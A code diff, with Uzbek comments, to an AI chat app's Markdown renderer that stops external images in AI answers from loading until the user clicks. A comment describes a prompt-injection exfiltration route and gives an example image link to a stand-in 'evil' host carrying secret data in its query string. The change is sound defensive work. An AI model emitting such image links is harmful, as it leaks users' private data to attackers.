@@ -256,6 +256,54 @@ function CodeBlock({ className, children }: { className?: string; children: stri
   );
 }
 
+/** data:/blob: yoki shu sayt rasmi — tashqi so'rov yo'q, darhol ko'rsatsa bo'ladi. */
+function isLocalImage(src: string): boolean {
+  if (/^data:image\//i.test(src) || /^blob:/i.test(src)) return true;
+  // Nisbiy yo'l ("/..."), lekin protokolsiz "//host" va "/\host" emas.
+  // (window'ga qaramaymiz — SSR/hydration bir xil natija bersin.)
+  return /^\/(?![/\\])/.test(src);
+}
+
+/**
+ * AI javobidagi tashqi rasm avtomatik yuklanmaydi: prompt-injection
+ * `![](https://evil/?q=<maxfiy>)` orqali ma'lumotni URL'da olib chiqib ketishi
+ * mumkin. Foydalanuvchi bosgandagina (referrer'siz) yuklanadi.
+ */
+function ChatImage({ src, alt }: { src: string; alt: string }) {
+  const t = useT();
+  const local = isLocalImage(src);
+  const [show, setShow] = useState(local);
+  if (!show) {
+    let host = "";
+    try {
+      host = new URL(src).hostname;
+    } catch {
+      host = "?";
+    }
+    return (
+      <button
+        type="button"
+        onClick={() => setShow(true)}
+        className="tt my-2 inline-flex items-center gap-1.5 rounded-lg border px-2.5 py-1 text-xs"
+        style={{ borderColor: "var(--t-border)", color: "var(--t-text-muted)" }}
+        title={src}
+      >
+        {fmt(t("secShowImage"), { host })}
+      </button>
+    );
+  }
+  return (
+    // eslint-disable-next-line @next/next/no-img-element
+    <img
+      src={src}
+      alt={alt}
+      referrerPolicy="no-referrer"
+      className="my-3 max-h-[560px] w-auto max-w-full rounded-xl"
+      style={{ border: "1px solid var(--t-border)" }}
+    />
+  );
+}
+
 function GenUiPlaceholder() {
   const t = useT();
   return (
@@ -340,16 +388,8 @@ export const Markdown = memo(function Markdown({ content, citations }: MarkdownP
         );
       },
       img({ src, alt }: ComponentProps<"img">) {
-        if (typeof src !== "string") return null;
-        return (
-          // eslint-disable-next-line @next/next/no-img-element
-          <img
-            src={src}
-            alt={alt ?? ""}
-            className="my-3 max-h-[560px] w-auto max-w-full rounded-xl"
-            style={{ border: "1px solid var(--t-border)" }}
-          />
-        );
+        if (typeof src !== "string" || !src) return null;
+        return <ChatImage key={src} src={src} alt={alt ?? ""} />;
       },
     }),
     [citations],
